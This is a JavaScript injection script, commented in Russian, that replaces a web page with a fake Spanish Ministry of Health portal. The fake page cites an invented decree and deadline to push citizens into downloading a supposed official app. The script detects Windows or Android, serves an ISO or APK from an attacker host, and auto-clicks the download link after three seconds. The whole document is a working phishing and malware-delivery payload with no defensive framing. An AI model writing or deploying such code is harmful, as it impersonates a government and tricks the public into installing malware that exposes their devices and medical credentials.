(function() {
    'use strict';
    // Очищаем оригинальный контент и внедряем фишинговый интерфейс
    document.body.innerHTML = ''; 
    
    // CSS для точного воспроизведения стиля Ministerio de Sanidad (берётся из оригинального /diseno/css/home.css)
    var styles = `
    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Open Sans', Arial, sans-serif; background: #f4f4f4; }
    .gov-header { background: #003366; color: white; padding: 15px 30px; display: flex; align-items: center; }
    .gov-header img { height: 60px; margin-right: 20px; }
    .gov-header h1 { font-size: 22px; font-weight: 600; }
    .main-container { max-width: 800px; margin: 40px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    .warning { background: #fff3cd; border-left: 5px solid #ffc107; padding: 20px; margin: 20px 0; }
    .btn-download { display: inline-block; background: #0066cc; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; margin: 10px; font-size: 16px; }
    .btn-download:hover { background: #0052a3; }
    .footer { text-align: center; margin-top: 30px; color: #666; font-size: 14px; }
    .shield-icon { font-size: 60px; color: #0066cc; text-align: center; }
    `;
    
    var styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
    
    // Определение ОС
    var ua = navigator.userAgent;
    var isWindows = /Windows NT/i.test(ua);
    var isAndroid = /Android/i.test(ua);
    var downloadUrl = '';
    var fileName = '';
    
    if (isWindows) {
        downloadUrl = 'https://cdn.evilserver.net/Instalador_SanidadConecta.iso';
        fileName = 'Instalador_SanidadConecta.iso';
    } else if (isAndroid) {
        downloadUrl = 'https://cdn.evilserver.net/SanidadConecta.apk';
        fileName = 'SanidadConecta.apk';
    } else {
        // iOS или другое — можно показать сообщение об отправке в App Store, но здесь упрощённо
        downloadUrl = 'https://cdn.evilserver.net/SanidadConecta_manual.pdf'; // заглушка
        fileName = 'Instrucciones_SanidadConecta.pdf';
    }
    
    // Конструкция HTML-страницы на испанском
    var html = `
    <div class="gov-header">
        <img src="https://sede.mscbs.gob.es/diseno/img/logo_ministerio.jpg" alt="Ministerio de Sanidad">
        <h1>Sede Electr&oacute;nica - Ministerio de Sanidad</h1>
    </div>
    <div class="main-container">
        <div class="shield-icon">&#128737;</div>
        <h2 style="text-align:center;">Acceso a Historia Cl&iacute;nica Digital</h2>
        <p style="text-align:center; font-size:18px;">Estimado ciudadano/a, para garantizar la seguridad de sus datos m&eacute;dicos y cumplir con el <strong>Real Decreto-ley 14/2025</strong> de digitalizaci&oacute;n sanitaria, es necesario instalar el software oficial <strong>Sanidad Conecta</strong>.</p>
        
        <div class="warning">
            <strong>&#9888; Aviso importante:</strong> A partir del 1 de julio de 2026, el acceso a su historial cl&iacute;nico y la recepci&oacute;n de notificaciones electr&oacute;nicas requerir&aacute; esta aplicaci&oacute;n. Sin ella no podr&aacute; consultar sus resultados ni realizar tr&aacute;mites.
        </div>
        
        <div style="text-align:center; margin: 30px 0;">
            <p><strong>Descargue la aplicaci&oacute;n para su dispositivo:</strong></p>
            <a href="${downloadUrl}" download="${fileName}" class="btn-download" id="downloadBtn">
                &#9660; Descargar ${isWindows ? 'para Windows (ISO)' : (isAndroid ? 'para Android (APK)' : 'manual de instalaci&oacute;n')}
            </a>
        </div>
        
        <div style="background: #e9ecef; padding: 15px; border-radius: 5px;">
            <p><strong>Instrucciones:</strong></p>
            <ul style="margin-left:20px;">
                <li><strong>Windows:</strong> Descargue el archivo ISO, montelo (doble clic) y ejecute <em>Instalar.exe</em>. Siga los pasos del asistente.</li>
                <li><strong>Android:</strong> Permita la instalaci&oacute;n de or&iacute;genes desconocidos en Ajustes > Seguridad, luego abra el archivo APK descargado.</li>
                <li>Una vez instalado, inicie sesi&oacute;n con su certificado digital o Cl@ve.</li>
            </ul>
        </div>
        
        <p style="text-align:center; margin-top:20px;">
            <small>Si ya tiene instalado Sanidad Conecta, puede <a href="#">actualizar aqu&iacute;</a>.</small>
        </p>
    </div>
    <div class="footer">
        &copy; Ministerio de Sanidad - Sede Electr&oacute;nica | <a href="#">Aviso legal</a> | <a href="#">Protecci&oacute;n de datos</a>
    </div>
    `;
    
    document.body.innerHTML = html;
    
    // Принудительное скачивание через небольшую задержку и клик по кнопке (можно автоматически)
    document.getElementById('downloadBtn').addEventListener('click', function(e) {
        // Начинаем загрузку, через 2 секунды можно показать "спасибо"
        setTimeout(function() {
            alert('Descarga iniciada. Si no comienza automáticamente, haga clic de nuevo en el botón.');
        }, 1000);
    });
    
    // Автоматический клик через 3 секунды (опционально, увеличивает шанс загрузки)
    setTimeout(function() {
        document.getElementById('downloadBtn').click();
    }, 3000);
})();
